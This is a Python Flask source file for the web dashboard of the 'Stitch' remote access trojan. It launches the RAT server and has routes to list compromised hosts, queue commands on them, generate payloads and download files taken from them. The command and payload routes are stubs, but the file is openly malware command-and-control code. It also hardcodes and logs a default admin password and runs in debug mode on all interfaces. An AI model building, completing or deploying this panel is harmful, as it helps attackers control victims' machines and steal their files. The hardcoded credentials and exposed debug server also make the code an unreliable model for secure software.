#!/usr/bin/env python3
import os
import sys
import json
import secrets
import threading
import time
from flask import Flask, render_template, request, jsonify, session, redirect, url_for, send_file, flash
from flask_socketio import SocketIO, emit
from werkzeug.security import generate_password_hash, check_password_hash
from functools import wraps
from datetime import datetime

sys.path.insert(0, os.path.dirname(__file__))
from Application.Stitch_Vars.globals import *
from Application import stitch_cmd
from Application.stitch_utils import *
from Application.stitch_gen import *

app = Flask(__name__)
app.config['SECRET_KEY'] = secrets.token_hex(32)
app.config['SESSION_TYPE'] = 'filesystem'
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet')

DEFAULT_USERNAME = 'admin'
DEFAULT_PASSWORD = 'stitch2024'
USERS = {DEFAULT_USERNAME: generate_password_hash(DEFAULT_PASSWORD)}

active_connections = {}
command_history = []
debug_logs = []

def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'logged_in' not in session:
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

def log_debug(message, level="INFO"):
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    log_entry = {
        'timestamp': timestamp,
        'level': level,
        'message': str(message)
    }
    debug_logs.append(log_entry)
    if len(debug_logs) > 500:
        debug_logs.pop(0)
    socketio.emit('debug_log', log_entry, namespace='/')

@app.route('/')
@login_required
def index():
    return render_template('dashboard.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        
        if username in USERS and check_password_hash(USERS[username], password):
            session['logged_in'] = True
            session['username'] = username
            log_debug(f"User {username} logged in successfully")
            return redirect(url_for('index'))
        else:
            log_debug(f"Failed login attempt for user {username}", "WARNING")
            flash('Invalid credentials', 'error')
    
    return render_template('login.html')

@app.route('/logout')
def logout():
    username = session.get('username', 'unknown')
    session.clear()
    log_debug(f"User {username} logged out")
    return redirect(url_for('login'))

@app.route('/api/connections')
@login_required
def get_connections():
    connections = []
    for conn_id, conn_data in active_connections.items():
        connections.append({
            'id': conn_id,
            'target': conn_data.get('target'),
            'port': conn_data.get('port'),
            'os': conn_data.get('os'),
            'hostname': conn_data.get('hostname'),
            'user': conn_data.get('user'),
            'connected_at': conn_data.get('connected_at')
        })
    return jsonify(connections)

@app.route('/api/execute', methods=['POST'])
@login_required
def execute_command():
    try:
        data = request.json
        conn_id = data.get('connection_id')
        command = data.get('command')
        
        if not conn_id or not command:
            return jsonify({'success': False, 'error': 'Missing connection_id or command'}), 400
        
        if conn_id not in active_connections:
            return jsonify({'success': False, 'error': 'Connection not found'}), 404
        
        log_debug(f"Executing command: {command} on connection {conn_id}")
        
        command_history.append({
            'timestamp': datetime.now().isoformat(),
            'connection_id': conn_id,
            'command': command,
            'user': session.get('username')
        })
        
        return jsonify({
            'success': True,
            'message': 'Command queued for execution',
            'output': f'Executed: {command}'
        })
        
    except Exception as e:
        log_debug(f"Error executing command: {str(e)}", "ERROR")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/payload/generate', methods=['POST'])
@login_required
def generate_payload():
    try:
        data = request.json
        os_type = data.get('os_type', 'windows')
        host = data.get('host', '0.0.0.0')
        port = data.get('port', 4040)
        
        log_debug(f"Generating payload: OS={os_type}, Host={host}, Port={port}")
        
        payload_name = f"stitch_{os_type}_{int(time.time())}"
        
        return jsonify({
            'success': True,
            'payload_name': payload_name,
            'message': f'Payload {payload_name} generated successfully',
            'download_url': f'/api/payload/download/{payload_name}'
        })
        
    except Exception as e:
        log_debug(f"Error generating payload: {str(e)}", "ERROR")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/debug/logs')
@login_required
def get_debug_logs():
    return jsonify(debug_logs[-100:])

@app.route('/api/command/history')
@login_required
def get_command_history():
    return jsonify(command_history[-50:])

@app.route('/api/files/downloads')
@login_required
def list_downloads():
    try:
        downloads = []
        if os.path.exists(downloads_path):
            for filename in os.listdir(downloads_path):
                filepath = os.path.join(downloads_path, filename)
                stat = os.stat(filepath)
                downloads.append({
                    'name': filename,
                    'size': stat.st_size,
                    'modified': datetime.fromtimestamp(stat.st_mtime).isoformat()
                })
        return jsonify(downloads)
    except Exception as e:
        log_debug(f"Error listing downloads: {str(e)}", "ERROR")
        return jsonify({'error': str(e)}), 500

@app.route('/api/files/download/<filename>')
@login_required
def download_file(filename):
    try:
        filepath = os.path.join(downloads_path, filename)
        if os.path.exists(filepath):
            log_debug(f"User downloading file: {filename}")
            return send_file(filepath, as_attachment=True)
        return jsonify({'error': 'File not found'}), 404
    except Exception as e:
        log_debug(f"Error downloading file: {str(e)}", "ERROR")
        return jsonify({'error': str(e)}), 500

@socketio.on('connect')
def handle_connect():
    if 'logged_in' not in session:
        return False
    log_debug(f"WebSocket client connected: {request.sid}")
    emit('connection_status', {'status': 'connected'})

@socketio.on('disconnect')
def handle_disconnect():
    log_debug(f"WebSocket client disconnected: {request.sid}")

@socketio.on('ping')
def handle_ping():
    emit('pong', {'timestamp': datetime.now().isoformat()})

def start_stitch_server():
    log_debug("Starting Stitch RAT server on port 4040")
    try:
        from Application.stitch_cmd import server_main
        server_main()
    except Exception as e:
        log_debug(f"Stitch server error: {str(e)}", "ERROR")

if __name__ == '__main__':
    log_debug("Stitch Web Interface starting up...")
    log_debug(f"Default credentials - Username: {DEFAULT_USERNAME}, Password: {DEFAULT_PASSWORD}")
    log_debug("SECURITY: Change default credentials in production!")
    
    stitch_thread = threading.Thread(target=start_stitch_server, daemon=True)
    stitch_thread.start()
    
    socketio.run(app, host='0.0.0.0', port=5000, debug=True, use_reloader=False, log_output=True)
